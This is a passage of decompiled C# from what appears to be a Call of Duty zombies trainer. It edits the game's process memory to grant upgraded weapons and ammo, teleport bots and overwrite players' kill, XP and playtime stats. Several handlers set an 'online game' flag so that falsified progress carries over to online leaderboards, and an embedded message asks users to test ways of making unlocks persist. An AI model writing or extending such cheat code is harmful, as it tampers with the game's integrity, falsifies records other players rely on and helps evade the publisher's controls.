				string text = this.comboBox2.Text;
				for (int i = 0; i < 4; i++)
				{
					if (this.comboBox2.Text == "XM4")
					{
						this.giveWeapon2(Main.WeaponXM4PAP, i);
					}
					else if (this.comboBox2.Text == "AK-47")
					{
						this.giveWeapon2(Main.WeaponAK47PAP, i);
					}
					else if (this.comboBox2.Text == "Krig 6")
					{
						this.giveWeapon2(Main.WeaponKrig6PAP, i);
					}
					else if (this.comboBox2.Text == "QBZ-83")
					{
						this.giveWeapon2(Main.WeaponQBZ83PAP, i);
					}
					else if (this.comboBox2.Text == "FFAR")
					{
						this.giveWeapon2(Main.WeaponFFAR1PAP, i);
					}
					else if (this.comboBox2.Text == "Groza")
					{
						this.giveWeapon2(Main.WeaponGrozaPAP, i);
					}
					else if (this.comboBox2.Text == "FARA")
					{
						this.giveWeapon2(Main.WeaponFARA83PAP, i);
					}
					else if (this.comboBox2.Text == "MP5")
					{
						this.giveWeapon2(Main.WeaponMP5PAP, i);
					}
					else if (this.comboBox2.Text == "Milano 821")
					{
						this.giveWeapon2(Main.WeaponMilano821PAP, i);
					}
					else if (this.comboBox2.Text == "AK-47u")
					{
						this.giveWeapon2(Main.WeaponAk74uPAP, i);
					}
					else if (this.comboBox2.Text == "KSP-45")
					{
						this.giveWeapon2(Main.WeaponKSP45PAP, i);
					}
					else if (this.comboBox2.Text == "Bullfrog")
					{
						this.giveWeapon2(Main.WeaponBullfrogPAP, i);
					}
					else if (this.comboBox2.Text == "Mac 10")
					{
						this.giveWeapon2(Main.WeaponMac10PAP, i);
					}
					else if (this.comboBox2.Text == "LC10")
					{
						this.giveWeapon2(Main.WeaponLC10PAP, i);
					}
					else if (this.comboBox2.Text == "Gallo SA12")
					{
						this.giveWeapon2(Main.WeaponGalloSA12PAP, i);
					}
					else if (this.comboBox2.Text == "Hauer")
					{
						this.giveWeapon2(Main.WeaponHauer77PAP, i);
					}
					else if (this.comboBox2.Text == "Streetsweeper")
					{
						this.giveWeapon2(Main.WeaponStreetSweeperPAP, i);
					}
					else if (this.comboBox2.Text == "Pellington")
					{
						this.giveWeapon2(Main.WeaponPelington703PAP, i);
					}
					else if (this.comboBox2.Text == "LW3")
					{
						this.giveWeapon2(Main.WeaponLW3TundraPAP, i);
					}
					else if (this.comboBox2.Text == "M82")
					{
						this.giveWeapon2(Main.WeaponM82PAP, i);
					}
					else if (this.comboBox2.Text == "ZRG 20MM")
					{
						this.giveWeapon2(Main.WeaponZRGmmEPAP, i);
					}
					else if (this.comboBox2.Text == "Type 63")
					{
						this.giveWeapon2(Main.WeaponType63PAP, i);
					}
					else if (this.comboBox2.Text == "M16")
					{
						this.giveWeapon2(Main.WeaponM16PAP, i);
					}
					else if (this.comboBox2.Text == "AUG")
					{
						this.giveWeapon2(Main.WeaponAUGPAP, i);
					}
					else if (this.comboBox2.Text == "DMR")
					{
						this.giveWeapon2(Main.WeaponDMR14PAP, i);
					}
					else if (this.comboBox2.Text == "Stoner 63")
					{
						this.giveWeapon2(Main.WeaponStoner63PAP, i);
					}
					else if (this.comboBox2.Text == "RPD")
					{
						this.giveWeapon2(Main.WeaponRPDPAP, i);
					}
					else if (this.comboBox2.Text == "M60")
					{
						this.giveWeapon2(Main.WeaponM60PAP, i);
					}
					else if (this.comboBox2.Text == "1911")
					{
						this.giveWeapon2(Main.Weapon1911PAP, i);
					}
					else if (this.comboBox2.Text == "Magnum")
					{
						this.giveWeapon2(Main.WeaponMagnumPAP, i);
					}
					else if (this.comboBox2.Text == "Diamatti")
					{
						this.giveWeapon2(Main.WeaponDiamattiPAP, i);
					}
					else if (this.comboBox2.Text == "Knife")
					{
						this.giveWeapon2(Main.WeaponKnifePAP, i);
					}
					else if (this.comboBox2.Text == "Sledgehammer")
					{
						this.giveWeapon2(Main.WeaponSledgeHammerPAP, i);
					}
					else if (this.comboBox2.Text == "Wakizashi")
					{
						this.giveWeapon2(Main.WeaponWakizashiPAP, i);
					}
					else if (this.comboBox2.Text == "RPG")
					{
						this.giveWeapon2(Main.WeaponRPG7PAP, i);
					}
					else if (this.comboBox2.Text == "Cigma")
					{
						this.giveWeapon2(Main.WeaponCigma2PAP, i);
					}
					else if (this.comboBox2.Text == "M79")
					{
						this.giveWeapon2(Main.WeaponM79PAP, i);
					}
					else if (this.comboBox2.Text == "Crossbow")
					{
						this.giveWeapon2(Main.WeaponR1ShadowhunterCrossbowPAP, i);
					}
					else if (this.comboBox2.Text == "E-Tool")
					{
						this.giveWeapon2(Main.WeaponETool2PAP, i);
					}
					else if (this.comboBox2.Text == "Machete")
					{
						this.giveWeapon2(Main.WeaponMachetePAP, i);
					}
				}
			}
		}

		// Token: 0x060002D0 RID: 720 RVA: 0x00013B38 File Offset: 0x00013B38
		private void checkBox10_CheckedChanged_1(object sender, EventArgs e)
		{
			if (this.checkBox10.Checked)
			{
				if (Main.<>o__523.<>p__0 == null)
				{
					Main.<>o__523.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__523.<>p__0.Target(Main.<>o__523.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int i = 0; i < 18; i++)
					{
						long gclient = this.GetGClient(i);
						if (this.mem.ReadString(gclient + 24716L).Contains("YKTV"))
						{
							this.mem.WriteUInt(gclient + 3684L, 2684354560U);
						}
					}
					return;
				}
			}
			else
			{
				if (Main.<>o__523.<>p__1 == null)
				{
					Main.<>o__523.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__523.<>p__1.Target(Main.<>o__523.<>p__1, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int j = 0; j < 18; j++)
					{
						long gclient2 = this.GetGClient(j);
						if (this.mem.ReadString(gclient2 + 24716L).Contains("YKTV"))
						{
							this.mem.WriteUInt(gclient2 + 3684L, 536870912U);
						}
					}
				}
			}
		}

		// Token: 0x060002D1 RID: 721 RVA: 0x00013CA5 File Offset: 0x00013CA5
		private void checkBox11_CheckedChanged_1(object sender, EventArgs e)
		{
			if (this.checkBox11.Checked)
			{
				this.mp_ammo.RunWorkerAsync();
				return;
			}
			this.mp_ammo.CancelAsync();
		}

		// Token: 0x060002D2 RID: 722 RVA: 0x00013CCC File Offset: 0x00013CCC
		private void mp_ammo_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.checkBox11.Checked)
			{
				if (Main.<>o__525.<>p__0 == null)
				{
					Main.<>o__525.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__525.<>p__0.Target(Main.<>o__525.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int i = 0; i < 18; i++)
					{
						long gclient = this.GetGClient(i);
						if (this.mem.ReadString(gclient + 24716L).Contains("YKTV"))
						{
							this.mem.WriteInt(gclient + 4968L, 50);
							this.mem.WriteInt(gclient + 4976L, 50);
							this.mem.WriteInt(gclient + 5080L, 50);
							this.mem.WriteInt(gclient + 5084L, 50);
							this.mem.WriteInt(gclient + 5088L, 50);
							this.mem.WriteInt(gclient + 5076L, 50);
							this.mem.WriteInt(gclient + 5100L, 50);
							this.mem.WriteInt(gclient + 5092L, 50);
							this.mem.WriteInt(gclient + 5096L, 50);
						}
						else
						{
							this.mem.WriteInt(gclient + 4968L, 0);
							this.mem.WriteInt(gclient + 4976L, 0);
							this.mem.WriteInt(gclient + 5080L, 0);
							this.mem.WriteInt(gclient + 5084L, 0);
							this.mem.WriteInt(gclient + 5088L, 0);
							this.mem.WriteInt(gclient + 5076L, 0);
							this.mem.WriteInt(gclient + 5100L, 0);
							this.mem.WriteInt(gclient + 5092L, 0);
							this.mem.WriteInt(gclient + 5096L, 0);
						}
					}
				}
				Thread.Sleep(100);
			}
		}

		// Token: 0x060002D3 RID: 723 RVA: 0x00013F08 File Offset: 0x00013F08
		private void thirteenButton13_Click_2(object sender, EventArgs e)
		{
			if (Main.<>o__526.<>p__0 == null)
			{
				Main.<>o__526.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__526.<>p__0.Target(Main.<>o__526.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.TeleportPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.TeleportPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.TeleportPos[2] = this.mem.ReadFloat(gclient + 3568L);
			}
		}

		// Token: 0x060002D4 RID: 724 RVA: 0x00013FC8 File Offset: 0x00013FC8
		private void checkBox12_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox12.Checked)
			{
				this.teleportBots.RunWorkerAsync();
			}
			this.teleportBots.CancelAsync();
		}

		// Token: 0x060002D5 RID: 725 RVA: 0x00013FF0 File Offset: 0x00013FF0
		private void checkBox13_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox13.Checked)
			{
				if (Main.<>o__528.<>p__0 == null)
				{
					Main.<>o__528.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__528.<>p__0.Target(Main.<>o__528.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					this.onlineGame.RunWorkerAsync();
					return;
				}
			}
			this.onlineGame.CancelAsync();
			if (Main.<>o__528.<>p__1 == null)
			{
				Main.<>o__528.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__528.<>p__1.Target(Main.<>o__528.<>p__1, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteInt(this.mem.BaseAddress + this.onlineOffset, 4129);
			}
		}

		// Token: 0x060002D6 RID: 726 RVA: 0x00005140 File Offset: 0x00005140
		private void groupBox3_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x060002D7 RID: 727 RVA: 0x000140F7 File Offset: 0x000140F7
		private void thirteenButton46_Click(object sender, EventArgs e)
		{
			MessageBox.Show("This was requested to be added back into the tool. The check box will constantly set the private match to online game. The buttons just do it once so there is some stuff there for you to test. There are also command to manually end the game so if you guys want to test different features to try and get camos to stick.\nHow I use This\n-----------------------\nSo pretty much i set online game to true on the checkbox BEFORE i start the game, all weapon levels/calling cards/emblems/challanges/leaderboard stuff will stick. Camos will not stick after restart though. In order for you to end the game without crashing you must turn off online game. Or you will crash. Alternativly you can sue the command I have listed below which bypass that crash. This whole section was added for the purposes of people testing a reporting back with a working method for camos to stick. So please use trial and error and test a fuck ton of different ways because i could not get it figured out.");
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x00014104 File Offset: 0x00014104
		private void thirteenButton47_Click(object sender, EventArgs e)
		{
			if (Main.<>o__531.<>p__0 == null)
			{
				Main.<>o__531.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__531.<>p__0.Target(Main.<>o__531.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.sendCbuf(this.comboBox3.Text);
			}
		}

		// Token: 0x060002D9 RID: 729 RVA: 0x0001417C File Offset: 0x0001417C
		private void thirteenButton45_Click(object sender, EventArgs e)
		{
			if (Main.<>o__532.<>p__0 == null)
			{
				Main.<>o__532.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__532.<>p__0.Target(Main.<>o__532.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteInt(this.mem.BaseAddress + this.onlineOffset, 4129);
			}
		}

		// Token: 0x060002DA RID: 730 RVA: 0x00014208 File Offset: 0x00014208
		private void thirteenButton34_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__533.<>p__0 == null)
			{
				Main.<>o__533.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__533.<>p__0.Target(Main.<>o__533.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteInt(this.mem.BaseAddress + this.onlineOffset, 33);
			}
		}

		// Token: 0x060002DB RID: 731 RVA: 0x00014290 File Offset: 0x00014290
		private void thirteenButton36_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__534.<>p__0 == null)
			{
				Main.<>o__534.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__534.<>p__0.Target(Main.<>o__534.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteFloat(this.mem.BaseAddress + 263188628L + 124L, 40f);
			}
		}

		// Token: 0x060002DC RID: 732 RVA: 0x00014320 File Offset: 0x00014320
		private void thirteenButton48_Click(object sender, EventArgs e)
		{
			if (Main.<>o__535.<>p__0 == null)
			{
				Main.<>o__535.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__535.<>p__0.Target(Main.<>o__535.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteFloat(this.mem.BaseAddress + 263188628L, 40f);
			}
		}

		// Token: 0x060002DD RID: 733 RVA: 0x000143AC File Offset: 0x000143AC
		private void thirteenButton49_Click(object sender, EventArgs e)
		{
			if (Main.<>o__536.<>p__0 == null)
			{
				Main.<>o__536.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__536.<>p__0.Target(Main.<>o__536.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteFloat(this.mem.BaseAddress + 263188624L, 40f);
			}
		}

		// Token: 0x060002DE RID: 734 RVA: 0x00005140 File Offset: 0x00005140
		private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060002DF RID: 735 RVA: 0x00005140 File Offset: 0x00005140
		private void Lbl_CurrentWeaponIndex_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002E0 RID: 736 RVA: 0x00014438 File Offset: 0x00014438
		public long Get_ClientT(int index)
		{
			if (Main.<>o__542.<>p__0 == null)
			{
				Main.<>o__542.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__542.<>p__0.Target(Main.<>o__542.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				return this.mem.ReadInt64(this.mem.BaseAddress + this.fastRun) + this.clientSize * (long)index;
			}
			return 0L;
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x000144CC File Offset: 0x000144CC
		public long Stats(int index)
		{
			if (Main.<>o__543.<>p__0 == null)
			{
				Main.<>o__543.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__543.<>p__0.Target(Main.<>o__543.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long pAddress = this.Get_ClientT(0) + 53160L;
				return this.mem.ReadInt64(pAddress) + (long)(137598 * index);
			}
			return 0L;
		}

		// Token: 0x060002E2 RID: 738 RVA: 0x0001455C File Offset: 0x0001455C
		public void SendIntStats(int client, uint xPos, int value)
		{
			long num = this.Stats(client);
			this.mem.WriteInt(num + (long)((ulong)xPos), value);
		}

		// Token: 0x060002E3 RID: 739 RVA: 0x00014584 File Offset: 0x00014584
		private void thirteenButton11_Click_3(object sender, EventArgs e)
		{
			if (this.comboBox4.SelectedIndex == 0)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 1)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 2)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 3)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 4)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 5)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 6)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 7)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 8)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 9)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 10)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
			if (this.comboBox4.SelectedIndex == 11)
			{
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.XP1, Convert.ToInt32(this.thirteenTextBox2.Text));
				this.SendIntStats(Convert.ToInt32(this.thirteenTextBox3.Text), Main.StatsDDL_Stats.XP2, Convert.ToInt32(this.thirteenTextBox2.Text));
			}
		}

		// Token: 0x060002E4 RID: 740 RVA: 0x0001486C File Offset: 0x0001486C
		private void thirteenButton24_Click_3(object sender, EventArgs e)
		{
			if (Main.<>o__546.<>p__0 == null)
			{
				Main.<>o__546.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__546.<>p__0.Target(Main.<>o__546.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				string str = this.mem.ReadString(this.GetGClient(0) + this.namePTR);
				string str2 = this.mem.ReadString(this.GetGClient(1) + this.namePTR);
				string str3 = this.mem.ReadString(this.GetGClient(2) + this.namePTR);
				string str4 = this.mem.ReadString(this.GetGClient(3) + this.namePTR);
				this.label9.Text = "Player: " + str;
				this.label11.Text = "Player: " + str2;
				this.label12.Text = "Player: " + str3;
				this.label20.Text = "Player: " + str4;
			}
		}

		// Token: 0x060002E5 RID: 741 RVA: 0x00014998 File Offset: 0x00014998
		private void thirteenButton36_Click_2(object sender, EventArgs e)
		{
			if (this.radioButton5.Checked)
			{
				this.SendIntStats(0, Main.StatsDDL_Stats.GamesPlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills1, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills2, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills3, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq2, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites2, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.MaxElimInGame, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.TimePlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.TotalRounds, 0);
				return;
			}
			if (this.radioButton6.Checked)
			{
				this.SendIntStats(1, Main.StatsDDL_Stats.GamesPlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills1, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills2, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills3, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq2, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites2, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.MaxElimInGame, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.TimePlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.TotalRounds, 0);
				return;
			}
			if (this.radioButton7.Checked)
			{
				this.SendIntStats(2, Main.StatsDDL_Stats.GamesPlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills1, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills2, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.Kills3, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsCritiq2, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.KillsElites2, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.MaxElimInGame, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.TimePlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(2, Main.StatsDDL_Stats.TotalRounds, 0);
				return;
			}
			if (this.radioButton8.Checked)
			{
				this.SendIntStats(3, Main.StatsDDL_Stats.GamesPlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills1, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills2, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.Kills3, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsCritiq2, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.KillsElites2, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.MaxElimInGame, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.TimePlayed, 0);
				Thread.Sleep(500);
				this.SendIntStats(3, Main.StatsDDL_Stats.TotalRounds, 0);
				return;
			}
			MessageBox.Show("Please select a player!");
		}

		// Token: 0x060002E6 RID: 742 RVA: 0x00014DC0 File Offset: 0x00014DC0
		private void thirteenButton29_Click_4(object sender, EventArgs e)
		{
			this.label30.Text = "Status: Applying.. Please Wait";
			if (this.radioButton5.Checked)
			{
				this.SendIntStats(0, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox10.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox11.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox12.Text));
				Thread.Sleep(500);
				this.SendIntStats(0, Main.StatsDDL_Stats.TotalRounds, Convert.ToInt32(this.thirteenTextBox6.Text));
				Thread.Sleep(500);
				this.label30.Text = "Status: Success!";
				return;
			}
			if (this.radioButton6.Checked)
			{
				this.SendIntStats(1, Main.StatsDDL_Stats.GamesPlayed, Convert.ToInt32(this.thirteenTextBox10.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills1, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills2, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.Kills3, Convert.ToInt32(this.thirteenTextBox9.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsCritiq2, Convert.ToInt32(this.thirteenTextBox8.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.KillsElites2, Convert.ToInt32(this.thirteenTextBox7.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.MaxElimInGame, Convert.ToInt32(this.thirteenTextBox11.Text));
				Thread.Sleep(500);
				this.SendIntStats(1, Main.StatsDDL_Stats.TimePlayed, Convert.ToInt32(this.thirteenTextBox12.Text));
				Thread.Sleep(500);
